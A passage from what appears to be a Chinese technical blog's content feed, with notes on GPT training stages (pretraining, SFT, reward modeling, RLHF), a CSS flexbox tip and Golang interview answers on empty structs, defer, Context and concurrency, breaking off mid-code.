src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/training-pipeline.png" alt="img"></p><h2 id="预训练"><a href="#预训练" class="headerlink" title="预训练"></a>预训练</h2><p>这个阶段占据了绝大多数的时间和算力，占据比例超过90%，</p><h3 id="数据集"><a href="#数据集" class="headerlink" title="数据集"></a>数据集</h3><p>首先需要收集大量的数据。例如，下面是 Meta <a href="https://arthurchiao.art/blog/llama-paper-zh/">训练 LLaMA 所用的数据集</a>，</p><table><thead><tr><th>占比</th><th>数据集</th><th>迭代次数（Epochs）</th><th>数据集大小（Disk size）</th></tr></thead><tbody><tr><td>67.0%</td><td>CommonCrawl</td><td>1.10</td><td>3.3 TB</td></tr><tr><td>15.0%</td><td>C4</td><td>1.06</td><td>783 GB</td></tr><tr><td>4.5%</td><td>Github</td><td>0.64</td><td>328 GB</td></tr><tr><td>4.5%</td><td>Wikipedia</td><td>2.45</td><td>83 GB</td></tr><tr><td>4.5%</td><td>Books</td><td>2.23</td><td>85 GB</td></tr><tr><td>2.5%</td><td>ArXiv</td><td>1.06</td><td>92 GB</td></tr><tr><td>2.0%</td><td>StackExchange</td><td>1.03</td><td>78 GB</td></tr></tbody></table><p>表 1：LLaMA 预训练数据。<br>其中 epochs 是用 1.4T tokens 预训练时的迭代次数。用 1T tokens 预训练时也是用的这个数据集比例。</p><p>可以大致看到这些数据集的类型。它们混合在一起，然后根据比例进行采样，得到 GPT 神经网络的训练集。</p><h3 id="文本token化"><a href="#文本token化" class="headerlink" title="文本token化"></a>文本token化</h3><p>在实际训练这些数据之前，需要经过一个<strong>预处理步骤</strong>，即 <strong>token 化</strong>。</p><ul><li>将<strong>原始文本</strong>翻译成<strong>整数序列</strong>，后者是 GPT 的表示方式。<ul><li>一个 token 可能是一个单词、一个词根、标点、标点+单词等等；</li><li><strong>每个 token 平均对应 0.75 个单词</strong>；</li><li>所有的独立 token 组成一个词典（词汇表），典型的词典大小：<strong>10k~100k tokens</strong>；</li></ul></li><li>这种<strong>文本/token 转换是无损的</strong>，有很多算法，例如常用的字节对编码。</li></ul><p>将数据集的文本进行编码、序列化，得到矢量数据，这样能够更好将自然语言在数学上映射出关联的紧密程度。每个token是语句可拆分的最小单位，例如一个单词、一个符号。</p><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/tokenizer.png" alt="img"></p><h3 id="超参数"><a href="#超参数" class="headerlink" title="超参数"></a>超参数</h3><p>接下来需要考虑控制阶段的超参数。这里拿两个具体模型 GPT-3/LLaMA 作为例子，</p><ul><li>GPT-4 的训练信息公开比较少，所以这里使用 GPT-3 的数据，注意 GPT-3 已经是三年前的模型了。</li><li><a href="https://arthurchiao.art/blog/llama-paper-zh/">LLaMA</a> 是 Meta 最近发布的一个开源模型，数据比较新，信息比较全。</li></ul><p>在GPT-3和LLaMA中主要关注<strong>词汇表大小</strong>、<strong>上下文长度</strong>、<strong>参数数量</strong>。</p><p><font><strong>词汇表大小</strong></font>通常为10k个token。</p><p><font><strong>上下文长度</strong></font>通常为2k/4k，有时甚至100k，这决定了模型在预测阶段中，预测序列下一个token所能看到的最大token数量。</p><p><font><strong>参数数量</strong></font>一定程度上决定模型的性能，但不是绝对的。例如LLaMA在1.4万亿个token上训练，训练时间更长，相较在0.3万亿个token训练的GPT-3表现效果更好，但是LLaMA的最大参数是65B，比GPT-3的175B少了<strong>将近2/3</strong>。</p><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/gpt3-vs-llama.png" alt="GPT-3 vs. LLaMA 超参数对比"></p><h3 id="硬件环境和成本"><a href="#硬件环境和成本" class="headerlink" title="硬件环境和成本"></a>硬件环境和成本</h3><table><thead><tr><th align="left"></th><th align="left">GPU</th><th align="left">训练时长</th><th align="left">训练成本</th></tr></thead><tbody><tr><td align="left">GPT-3</td><td align="left">约**<code>一万张 V100</code>**</td><td align="left">30 天左右</td><td align="left">$100 万 ~ $1000 万</td></tr><tr><td align="left">LLaMA</td><td align="left"><strong><code>两千张 A100</code></strong></td><td align="left">21 天</td><td align="left">$500 万</td></tr></tbody></table><blockquote><p>V100/A100 <a href="https://arthurchiao.art/blog/gpu-prices/">算力对比参考</a>。</p></blockquote><p>这些都是在预训练阶段应该考虑的。</p><h3 id="训练过程"><a href="#训练过程" class="headerlink" title="训练过程"></a>训练过程</h3><p>输入给Transformer的是<code>(B, T)</code>的矩阵，<code>B</code>表示批次大小，<code>T</code>表示上下文长度。每个上下文中序列（即连续完成的单句）末尾要添加标识符，上下文的开头和末尾则不需要添加。</p><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/hyperparams.png" alt="img"></p><h3 id="预测下一个token"><a href="#预测下一个token" class="headerlink" title="预测下一个token"></a>预测下一个token</h3><p>预测下一个token只能使用<strong>当前行</strong>的<strong>前T个token</strong>进行预测。下一个token有<font>词汇表数量N</font>种可能性。概率根据输入服从某种分布。</p><p><img src="https://arthurchiao.art/assets/img/how-to-train-a-gpt-assistant/hyperparams-2.png" alt="img"></p><p>现在看个更真实的训练，《纽约时报》团队在莎士比亚数据集上训练了一个小型 GPT。 下面是一小段莎士比亚文本和训练之后的采样效果：</p><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/training-process.png" alt="img"></p><p>采样的方式是预测下一个 token，可以看到：</p><ul><li>左下角：开始时，GPT 的权重是完全随机的，因此也会得到完全随机的采样输出。</li><li>右边：随着 GPT 训练时间越来越长，会得到越来越一致和连贯的采样输出。</li></ul><h3 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h3><p>控制训练的精度和梯度，即训练的效果和速度。</p><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/training-curves.png" alt="img"></p><h2 id="基座模型"><a href="#基座模型" class="headerlink" title="基座模型"></a>基座模型</h2><p>通过一个月的训练，在<strong>通用语料</strong>上构建的<strong>基座模型</strong>，能够针<strong>对任意的下游任务进行微调</strong>，预测的结果通常语句通顺、语义连贯。</p><h3 id="分类任务"><a href="#分类任务" class="headerlink" title="分类任务"></a>分类任务</h3><p>针对分类任务进行<strong>微调</strong>的话，可以：</p><ul><li>以前的做法是收集正负样本，训练某种NLP模型。</li><li>现在的做法是忽略情感分类，通过训练大型 Transformer，进行few-shot或zero-shot的文本生成，具有语义理解和泛化能力，进行高效的微调。</li></ul><h3 id="提示工程-文档补全（GPT-2）"><a href="#提示工程-文档补全（GPT-2）" class="headerlink" title="提示工程 + 文档补全（GPT-2）"></a>提示工程 + 文档补全（GPT-2）</h3><blockquote><p>在 GPT-2 时代，人们注意到<strong>比微调更好的方法</strong>是<strong>给模型以有效的提示</strong>。 <strong>语言模型功能其实非常单一，它们只想要补全文档</strong>（预测下一个 token 的高级形式），换句话说， 如果你想让它们完成其他任务，就要通过某些方式<strong>骗一下它们</strong>，让它们以为自己在补全文档就行了。——出自[State of GPT译文][1]</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/gpt-2.png" alt="img"></p><p>如下输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">问题：风扇有几个扇叶？</span><br><span class="line">回答：3</span><br><span class="line">问题：摩托车有几个车轮？</span><br><span class="line">回答：</span><br></pre></td></tr></table></figure><p>可以得到模型生成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure><p>即使GPT-5甚至未来，提示工程都对模型输出有优化作用。这就是<font>few-shot</font>，让它以为自己在补全（模仿）一个文档，而实际上是回答了我们的问题。</p><p>下图可以看到，提示工程在很多问题上非常有效，甚至不需要训练任何神经网络或微调。</p><p>　<img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/gpt-2-2.png" alt="img"></p><h3 id="基础模型不是助手"><a href="#基础模型不是助手" class="headerlink" title="基础模型不是助手"></a>基础模型不是助手</h3><p>基础模型在补充回答之外的效果很差，无法对话和回答问题。通过<font>监督微调（SFT）</font>能够增强模型回答问题的能力，使生成更具有针对性。</p><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/fig-1.png" alt="img"></p><h2 id="监督微调"><a href="#监督微调" class="headerlink" title="监督微调"></a>监督微调</h2><h3 id="收集高质量数据样本"><a href="#收集高质量数据样本" class="headerlink" title="收集高质量数据样本"></a>收集高质量数据样本</h3><p>通常是由<strong>人工提供</strong>数万条像格式是<strong>“提示 + 理想回答”</strong>的<font>高质量文本</font>作为训练数据。</p><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/sft-dataset.png" alt="img"></p><h3 id="SFT训练"><a href="#SFT训练" class="headerlink" title="SFT训练"></a>SFT训练</h3><p>同预训练同样的算法和训练过程，但只需要短短几天训练即可，例如：<code>vicuna-13b</code>。能够得到回答问题的模型，而不是只会补充文本的模型，这才是<font>真正的AI助手</font>。</p><p>如果想要更好的效果，还需进一步改进，从人类反馈中学习(RLHF)。</p><h2 id="奖励建模"><a href="#奖励建模" class="headerlink" title="奖励建模"></a>奖励建模</h2><p>RLHF 包括奖励建模和强化学习。</p><p>奖励建模阶段则是建立一个评审机制，对SFT模型生成文本进行评分，负反馈，从而优化权重。</p><h3 id="建立评审机制"><a href="#建立评审机制" class="headerlink" title="建立评审机制"></a>建立评审机制</h3><p>在原文中讲述的是利用SFT模型，比较优劣远远简单于文本生成，让SFT模型能够在人工评审的样本中学习，模仿评审，进行类似二元分类的操作，从而对模型生成文本进行比较。</p><p>奖励建模的模型同其他几个阶段不同，该模型只对任务进行评分，不适合单独部署，其他阶段的模型都能单独部署使用。</p><h3 id="奖励"><a href="#奖励" class="headerlink" title="奖励"></a>奖励</h3><p>现在来看一下如何对奖励进行建模。</p><p>将三次的提示+回答按行排列，</p><p><img src="https://arthurchiao.art/assets/img/how-to-train-a-gpt-assistant/rm-training.png" alt="img"></p><ul><li><strong>蓝色</strong>的是提示（prompt tokens），每行都一样；</li><li><strong>黄色</strong>的是 SFT 模型基于 prompt 产生的补全（completion tokens），每次都不同；</li><li><strong>绿色</strong>的是特殊的 <code>&lt;|reward|&gt;</code> token。</li></ul><p>这些数据一起作为新的输入，再训练一个 transforer 模型，</p><ul><li>输入：蓝色+黄色 tokens，即原始 prompt + SFT 模型补全</li><li>输出：绿色 token，即奖励（分数）</li></ul><p>也就是说，这个模型用“原始问题 + SFT 模型补全结果”来预测“SFT 模型补全结果”的好坏。 换句话说，<strong>对每个 SFT 模型的补全质量进行预测</strong>。这个预测用数值表示结果的好坏， 我们将这个转化为一个<strong>损失函数</strong>，并训练我们的模型使得奖励预测与人工给出的 comparison 基准一致。</p><p>这就是<strong>训练奖励模型的方法</strong>，这使我们能够对补全的结果好坏进行评分。</p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>跟基座模型、SFT 模型以及后面将介绍的强化学习模型相比，奖励模型的最大特点是<strong>不能独立部署</strong>， 也就是说不能单独部署这样的一个模型，然后接受用户提示（输入），给出有意义的输出（补全）。</p><p>为什么呢？上一节的原理其实已经给出答案了：奖励模型要求的输入是“问题+回答”，它的功能是对其中的“回答”进行评分，判断其好坏。 因此它只是一个完整系统中的模块，而并不是一个可以直接面向用户的模型。</p><h2 id="强化学习"><a href="#强化学习" class="headerlink" title="强化学习"></a>强化学习</h2><h3 id="RLHF训练"><a href="#RLHF训练" class="headerlink" title="RLHF训练"></a>RLHF训练</h3><p>通过奖励模型对根据提示生成的每个生成进行评分，高质量生成得到加分，反馈到模型权重中。即RLHF的训练过程。反复训练后得到一个可部署的模型，例如<strong>ChatGPT就是RLHF模型</strong>。</p><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p>Temperature 是 NLP 中的一个参数，用于控制生成文本的随机性和创造性。</p><ul><li>值越大，生成的结果越多样和不可预测；</li><li><strong>值越小</strong>，生成的结果越保守和<strong>可预测</strong>。</li></ul><p>repetition_penalty设置为大于 1 的数值后，能够避免程序输出太多的重复内容（对重复内容进行生成惩罚）。</p><p>no_repeat_ngram_size设置为某个整数时，模型在生成的时候，会杜绝连续生成相同的或者连续的 n 个重复词组。</p><p>Top_k设置可能出现词的范围，即单次采用token数量，Top_p设置单次累积采用的阈值，越大越好，防止出现重复单词。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>根据克伯利大学给出的ELO评分，目前<strong>排名前三的都是RLHF模型</strong>，其他均是SFT模型，目前效果最好的是GPT-4模型。</p><h3 id="为什么要使用-RLHF？"><a href="#为什么要使用-RLHF？" class="headerlink" title="为什么要使用 RLHF？"></a>为什么要使用 RLHF？</h3><p>简单回答是：<strong>效果好</strong>。 下图来自 InstructGPT 论文，其中 PPO 模型就是 RLHF 的。 从人类的反馈来看，质量从高到低依次为：RLHF 模型、SFT 模型、基座模型。</p><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/why-rlhf-1.png" alt="img"></p><p>那么，为什么 RLHF 效果这么好呢？<strong>社区并没有一个公认的解释</strong>， 但这里我可以提供一个可能的原因：<strong>比较（comparison）和生成（generation）在计算上的不对称性</strong>。</p><p>以生成一个俳句为例。假设让一个模型写一个关于回形针的俳句，</p><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/why-rlhf-2.png" alt="img"></p><ul><li>如果你是一个承包商，为 SFT 收集数据，那你应该如何为回形针创作一个好的俳句呢？这<strong>很难</strong>；</li><li>另一方面，但如果给你一些俳句的例子，让你对它们的好坏进行比较（评分），这个就<strong>简单</strong>多了；</li></ul><p>因此，判断比生成要容易的多。这种<strong>不对称性使得 comparison 成为一种潜在的更好方式</strong>（好落地，实操性强）， 可以利用人的判断力来创建一个更好的模型。</p><h3 id="模型的熵"><a href="#模型的熵" class="headerlink" title="模型的熵"></a>模型的熵</h3><p>某些情况下，RLHF 模型并不是基础模型的简单改进。特别是，我们注意到 RLHF 模型会<strong>丢失一些熵</strong>。</p><ul><li>这意味着它们会给出<strong>更加确定性的结果</strong>；相比基础模型，RLHF 模型的输出变化更少；</li><li>基础模型熵比较大，会给出很多不同的输出。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/mode-collapse.png" alt="img"></p><p>在以下情况下，我仍然喜欢使用基础模型：已经有 N 个东西，想生成更多类似的东西时。 例如下图，给出了 7 个 pokeman 名字，想得到更多类似的名字，</p><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/mode-collapse-2.png" alt="img"></p><p>后面给出的这些名字看着都是虚构的（没去验证）。我认为这种任务基础模型很擅长， 因为它熵比较大，因此能给出多样的、酷炫的、与之前给出的东西相似的输出。</p><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><ol><li><p><a href="https://build.microsoft.com/en-US/sessions/db3f4859-cd30-4445-a0cd-553c3304f8e2">State of GPT</a></p></li><li><p><a href="https://colab.research.google.com/drive/1SiF0KZJp75rUeetKOWqpsA8clmHP6jMg">TRANSFORMERS FROM SCRATCH</a></p></li><li><p><a href="https://colab.research.google.com/drive/1SiF0KZJp75rUeetKOWqpsA8clmHP6jMg">GPT as a finite-state markov chain</a></p></li><li><p><a href="https://github.com/datawhalechina/learn-nlp-with-transformers/blob/main/docs/%E7%AF%87%E7%AB%A02-Transformer%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/2.4-%E5%9B%BE%E8%A7%A3GPT.md">图解GPT</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 未分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS设置height 100%不生效</title>
      <link href="/posts/44550.html"/>
      <url>/posts/44550.html</url>
      
        <content type="html"><![CDATA[<h1 id="CSS设置height-100-不生效"><a href="#CSS设置height-100-不生效" class="headerlink" title="CSS设置height: 100%不生效"></a>CSS设置height: 100%不生效</h1><p>父元素没有固定高度的时候，子元素设置height: 100%不生效。但是可以通过flexbox布局或者grid布局来让元素自动填充剩余宽度或者高度。</p><p>html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;parent&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;child&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>css：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.parent</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">flex-direction</span>: column; <span class="comment">/* 确保子元素在父元素内垂直排列 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.child</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: <span class="number">1</span>; <span class="comment">/* 让子元素填充剩余空间 */</span></span><br><span class="line">  <span class="comment">/* 或者使用 flex: 1; 也可以实现同样的效果 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang题库（十）</title>
      <link href="/posts/52803.html"/>
      <url>/posts/52803.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 未分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang题库（十）</title>
      <link href="/posts/52804.html"/>
      <url>/posts/52804.html</url>
      
        <content type="html"><![CDATA[<h1 id="Golang题库（十）"><a href="#Golang题库（十）" class="headerlink" title="Golang题库（十）"></a>Golang题库（十）</h1><h2 id="空结构体占不占内存空间？-为什么使用空结构体？"><a href="#空结构体占不占内存空间？-为什么使用空结构体？" class="headerlink" title="空结构体占不占内存空间？ 为什么使用空结构体？"></a>空结构体占不占内存空间？ 为什么使用空结构体？</h2><h3 id="空结构体是没有内存大小的结构体。"><a href="#空结构体是没有内存大小的结构体。" class="headerlink" title="空结构体是没有内存大小的结构体。"></a><strong>空结构体是没有内存大小的结构体。</strong></h3><p>通过 <code>unsafe.Sizeof()</code> 可以查看空结构体的宽度，代码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">fmt.Println(unsafe.Sizeof(s)) <span class="comment">// prints 0</span></span><br></pre></td></tr></table></figure><p>准确的来说，空结构体有一个特殊起点： <code>zerobase</code> 变量。<code>zerobase</code>是一个占用 8 个字节的<code>uintptr</code>全局变量。每次定义 <code>struct &#123;&#125;</code> 类型的变量，编译器只是把<code>zerobase</code>变量的地址给出去。也就是说空结构体的变量的内存地址都是一样的。</p><h3 id="空结构体的使用场景主要有三种："><a href="#空结构体的使用场景主要有三种：" class="headerlink" title="空结构体的使用场景主要有三种："></a>空结构体的使用场景主要有三种：</h3><ul><li>实现方法接收者：在业务场景下，我们需要将方法组合起来，代表其是一个 ”分组“ 的，便于后续拓展和维护。</li><li>实现集合类型：在 Go 语言的标准库中并没有提供集合（Set）的相关实现，因此一般在代码中我们图方便，会直接用 map 来替代：<code>type Set map[string]struct&#123;&#125;</code>。</li><li>实现空通道：在 Go channel 的使用场景中，常常会遇到通知型 channel，其不需要发送任何数据，只是用于协调 Goroutine 的运行，用于流转各类状态或是控制并发情况。</li></ul><h2 id="Kratos-框架的特性"><a href="#Kratos-框架的特性" class="headerlink" title="Kratos 框架的特性"></a>Kratos 框架的特性</h2><p>Kratos 是一套轻量级的微服务框架，包含了大量微服务相关框架以及工具，它就像一个工具箱，目前已加入 CNCF 协会进行孵化。Kratos 框架最重要的特性就是可插拔，它并没有像字节的 go 微服务框架一样打造一套属于自己的生态，而是选择依赖开源社区的明星项目，将它们灵活的集成到 Kratos 中。</p><h2 id="defer-是怎么用的"><a href="#defer-是怎么用的" class="headerlink" title="defer 是怎么用的"></a>defer 是怎么用的</h2><h3 id="从-defer-关键字的常见使用场景和使用时需要注意什么来回答这个问题（不深入到实现原理）"><a href="#从-defer-关键字的常见使用场景和使用时需要注意什么来回答这个问题（不深入到实现原理）" class="headerlink" title="从 defer 关键字的常见使用场景和使用时需要注意什么来回答这个问题（不深入到实现原理）"></a>从 defer 关键字的常见使用场景和使用时需要注意什么来回答这个问题（不深入到实现原理）</h3><p><strong>defer 最常见的使用场景就是在函数调用结束后，完成一些收尾工作</strong>，例如在 defer 中回滚数据库的事务。在 go 语言中使用 defer 常会遇到的两个问题，首先是 defer 关键字的调用时机， defer 被多次调用时的执行顺序，其次是 defer 使用传值的方式传递参数时会进行预计算，会导致结果不符合预期。调用时机与作用域有关，预计算参数与预期不符与 defer 关键字的复制操作有关。</p><h2 id="Context-包的作用"><a href="#Context-包的作用" class="headerlink" title="Context 包的作用"></a>Context 包的作用</h2><p>Context 就像糖葫芦中的竹签子<br>它的作用是在上下文中传递除了业务参数之外的额外信息，这个额外信息是为了全局而考虑使用的，例如在微服务业务中，我们需要整个业务链条整体的超时时间信息。不过 go 标准库中的 Context 还提供了超时 Timeout 和 Cancel 机制。总的来说，在下面这些场景中，可以考虑使用 Context：</p><ul><li>上下文信息传递</li><li>控制子 goroutine 的运行</li><li>超时控制的方法调用</li><li>可以取消的方法调用</li></ul><h2 id="golang并发模型"><a href="#golang并发模型" class="headerlink" title="golang并发模型"></a>golang并发模型</h2><p><a href="https://studygolang.com/articles/10631?fr=sidebar">参考文章</a></p><p>golang控制并发有三种经典的方式,一种是通过<strong>channel</strong>通知实现并发控制 一种是<strong>WaitGroup</strong>,另外一种就是<strong>Context</strong>。</p><ol><li><p>使用最基本通过channel通知实现并发控制<br>无缓冲通道:<br>无缓冲的通道指的是通道的大小为0，也就是说，这种类型的通道在接收前没有能力保存任何值，它要求发送 goroutine 和接收 goroutine 同时准备好，才可以完成发送和接收操作。<br>从上面无缓冲的通道定义来看，发送 goroutine 和接收 gouroutine 必须是同步的，同时准备后，如果没有同时准备好的话，先执行的操作就会阻塞等待，直到另一个相对应的操作准备好为止。这种无缓冲的通道我们也称之为同步通道。<br>例子:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        ch &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    fmt.Println(&lt;-ch)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解释</strong><br>当主 goroutine 运行到 &lt;-ch 接受 channel 的值的时候，如果该 channel 中没有数据，就会一直阻塞等待，直到有值。 这样就可以简单实现并发控制。</p></li><li><p>通过sync包中的WaitGroup实现并发控制<br>在 sync 包中，提供了 WaitGroup ，它会等待它收集的所有 goroutine 任务全部完成，在主 goroutine 中 Add(delta int) 索要等待goroutine 的数量。<br>在每一个 goroutine 完成后 Done() 表示这一个goroutine 已经完成，当所有的 goroutine 都完成后，在主 goroutine 中 WaitGroup 返回返回。</p><p>例子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">fun main()&#123;</span><br><span class="line">    <span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line">    <span class="keyword">var</span> urls = []<span class="type">string</span>&#123;</span><br><span class="line">        <span class="string">&quot;http://www.golang.org/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;http://www.sensetime.com/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;http://www.baidu.com/&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> _, url := <span class="keyword">range</span> urls &#123;</span><br><span class="line">        wg.Add(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(url <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">            <span class="keyword">defer</span> wg.Done()</span><br><span class="line">            http.Get(url)</span><br><span class="line">        &#125;(url)</span><br><span class="line">    &#125;</span><br><span class="line">    wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在Go 1.7 以后引进的强大的Context上下文，实现并发控制<br>在一些简单场景下使用 channel 和 WaitGroup 已经足够了，但是当面临一些复杂多变的网络并发场景下 channel 和 WaitGroup 显得有些力不从心了。<br>比如一个网络请求 Request，每个 Request 都需要开启一个 goroutine 做一些事情，这些 goroutine 又可能会开启其他的 goroutine，比如数据库和RPC服务。<br>所以我们需要一种可以跟踪 goroutine 的方案，才可以达到控制他们的目的，这就是Go语言为我们提供的 Context，称之为上下文非常贴切，它就是goroutine 的上下文。<br>它是包括一个程序的运行环境、现场和快照等。每个程序要运行时，都需要知道当前程序的运行状态，通常Go 将这些封装在一个 Context 里，再将它传给要执行的 goroutine 。<br>context 包主要是用来处理多个 goroutine 之间共享数据，及多个 goroutine 的管理。<br>context包方法:<br>Done() 返回一个只能接受数据的channel类型，当该context关闭或者超时时间到了的时候，该channel就会有一个取消信号<br>Err() 在Done() 之后，返回context 取消的原因。<br>Deadline() 设置该context cancel的时间点<br>Value() 方法允许 Context 对象携带request作用域的数据，该数据必须是线程安全的。<br>例子:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">childFunc</span><span class="params">(cont context.Context, num *<span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    ctx, _ := context.WithCancel(cont)</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> &lt;-ctx.Done():</span><br><span class="line">            fmt.Println(<span class="string">&quot;child Done : &quot;</span>, ctx.Err())</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    gen := <span class="function"><span class="keyword">func</span><span class="params">(ctx context.Context)</span></span> &lt;-<span class="keyword">chan</span> <span class="type">int</span> &#123;</span><br><span class="line">        dst := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line">        n := <span class="number">1</span></span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            <span class="keyword">for</span> &#123;</span><br><span class="line">                <span class="keyword">select</span> &#123;</span><br><span class="line">                <span class="keyword">case</span> &lt;-ctx.Done():</span><br><span class="line">                    fmt.Println(<span class="string">&quot;parent Done : &quot;</span>, ctx.Err())</span><br><span class="line">                    <span class="keyword">return</span> <span class="comment">// returning not to leak the goroutine</span></span><br><span class="line">                <span class="keyword">case</span> dst &lt;- n:</span><br><span class="line">                    n++</span><br><span class="line">                    <span class="keyword">go</span> childFunc(ctx, &amp;n)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;()</span><br><span class="line">        <span class="keyword">return</span> dst</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ctx, cancel := 